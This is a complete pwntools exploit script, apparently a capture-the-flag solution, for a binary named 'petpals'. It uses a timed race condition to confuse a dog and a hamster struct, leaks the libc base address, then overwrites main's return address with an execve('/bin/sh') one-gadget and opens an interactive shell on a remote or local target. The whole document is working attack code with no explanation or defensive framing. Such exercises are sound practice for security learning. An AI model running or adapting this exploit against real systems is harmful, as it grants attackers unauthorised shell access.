#!/usr/bin/env python3
import time
from pwn import *

BINARY_PATH = './petpals'
ERROR_BY_NETWORK_LATENCY = 0.0
context.terminal = ['tmux', 'splitw', '-h']
libc = None
one_gadget_offset = None

def conn():
    global ERROR_BY_NETWORK_LATENCY
    global libc
    global one_gadget_offset

    if len(sys.argv) == 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
        ERROR_BY_NETWORK_LATENCY = 0.0  # for local docker
        # ERROR_BY_NETWORK_LATENCY = 0.0  # for local docker
        # libc = ELF('./libc.so.6')

        # 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
        # constraints:
        #   address rbp-0x50 is writable
        #   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
        #   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid env
        one_gadget_offset = 0xebd43
    else:
        r = process(BINARY_PATH)
        ERROR_BY_NETWORK_LATENCY = 0.0
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

        # 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
        # constraints:
        #   address rbp-0x50 is writable
        #   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
        #   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid env
        one_gadget_offset = 0xef52b
    return r


r = conn()


###############################################################################
# STAGE 1: Leak the base address of libc
###############################################################################

print('== STAGE 1: Leak the base address of libc ==')

# Creates a hamster
r.sendlineafter(b'\n> ', b'1')
r.sendlineafter(b'animal type: ', b'hamster')
r.sendlineafter(b'hamster name: ', b'any name')

# Sends the hamster for a walk
r.sendlineafter(b'\n> ', b'2')
start_time = time.time()

# Creates a dog
payload1 = b''
payload1 += b'a' * 16  # corresponding to 'name' field for hamster struct
payload1 += p64(64 + 1)  # corresponding to 'name_len' field for hamster struct

r.sendlineafter(b'\n> ', b'1')
r.sendlineafter(b'animal type: ', b'dog')
r.sendlineafter(b'dog name: ', payload1)

# Renames the dog (but recognized as hamster, not dog)
r.recvuntil(b'\n> ')
sleep_time = 4.0 - (time.time() - start_time) + ERROR_BY_NETWORK_LATENCY
print('[*] sleeping.. %.4fs' % (sleep_time))
time.sleep(sleep_time)

# This is to leverage multiple menus in a same moment. (renaming, sending)
payload2 = b''
payload2 += b'3\n'
payload2 += b'a' * 64
payload2 += b'2\n'

r.send(payload2)

res = r.recvuntil(b' for a walk..')
try:
    leaked = res.split(b' for a walk..')[0].split(b'a' * 64)[1]
    libc_start_call_main = u64(leaked + b'\x00\x00')
except:
    print('[*] run again. failed to leak(may failed to do the race condition).')
    exit(1)
print('libc_start_call_main..', hex(libc_start_call_main))
libc_base = libc_start_call_main - 0x0000000000029d90
print('libc_base..', hex(libc_base))

print('\n[*] may take a while.. (3 ~ 5 seconds)')
r.recvuntil(b' is returned from the walk and is satisfied!')
r.recvuntil(b' is returned from the walk and is satisfied!')


###############################################################################
# STAGE 2: Overwrite the return address of main() with one-gadget
###############################################################################

print('\n== STAGE 2: Overwrite the return address of main() with one-gadget ==')

# Creates a hamster
r.sendline(b'1')
r.sendlineafter(b'animal type: ', b'hamster')
r.sendlineafter(b'hamster name: ', b'any name')

# Sends the hamster for a walk
r.sendlineafter(b'\n> ', b'2')
start_time = time.time()

# Creates a dog
payload1 = b''
payload1 += b'a' * 16  # corresponding to 'name' field for hamster struct
payload1 += p64(72 + 1)  # corresponding to 'name_len' field for hamster struct

r.sendlineafter(b'\n> ', b'1')
r.sendlineafter(b'animal type: ', b'dog')
r.sendlineafter(b'dog name: ', payload1)

# Renames the dog (but recognized as hamster, not dog)
r.recvuntil(b'\n> ')
sleep_time = 4.0 - (time.time() - start_time) + ERROR_BY_NETWORK_LATENCY
print('[*] sleeping.. %.4fs' % (sleep_time))
time.sleep(sleep_time)

# This is to input multiple data lines in a same moment. (renaming)
payload2 = b''
payload2 += b'3\n'
payload2 += b'a' * 56
payload2 += p64(libc_base) # a valid SFP for the precondition of given one-gadget
payload2 += p64(libc_base + 0xebd43)

r.send(payload2)

# gets a shell
r.sendline(b'4')
r.interactive()
